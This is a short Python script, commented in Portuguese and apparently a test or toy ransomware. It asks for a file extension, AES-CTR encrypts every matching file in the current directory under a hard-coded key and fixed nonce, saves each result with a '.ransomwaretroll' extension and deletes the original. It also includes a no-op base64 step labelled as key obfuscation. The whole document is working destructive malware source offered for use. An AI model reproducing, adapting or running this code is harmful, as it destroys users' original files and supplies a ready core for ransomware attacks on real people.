import os
import logging
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Configurar logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def criptografar_arquivo(file_path, key):
    try:
        # Abrir o arquivo a ser criptografado
        with open(file_path, "rb") as file:
            file_data = file.read()

        # Criptografar os dados
        cipher = Cipher(algorithms.AES(key), modes.CTR(b"0" * 16), backend=default_backend())
        encryptor = cipher.encryptor()
        crypto_data = encryptor.update(file_data) + encryptor.finalize()

        # Salvar o arquivo criptografado
        new_file_path = f"{file_path}.ransomwaretroll"
        with open(new_file_path, "wb") as new_file:
            new_file.write(crypto_data)

        # Remover o arquivo original
        os.remove(file_path)
        logging.info(f"Arquivo criptografado: {file_path} -> {new_file_path}")
    except Exception as e:
        logging.error(f"Erro ao criptografar {file_path}: {e}")

# Solicitar o formato do arquivo
file_format = input("Digite o formato do arquivo que deseja criptografar (ex: .txt, .png): ")

# Obfuscar a chave de criptografia usando base64
raw_key = "testeransomwares"
key = base64.b64decode(base64.b64encode(raw_key.encode()))

# Garantir que a chave tenha 16 bytes (128 bits para AES)
if len(key) != 16:
    key = key[:16] if len(key) > 16 else key.ljust(16, b"0")

# Processar arquivos do formato especificado
for file_name in os.listdir():
    if file_name.endswith(file_format):
        criptografar_arquivo(file_name, key)

logging.info("Processo de criptografia concluído!")
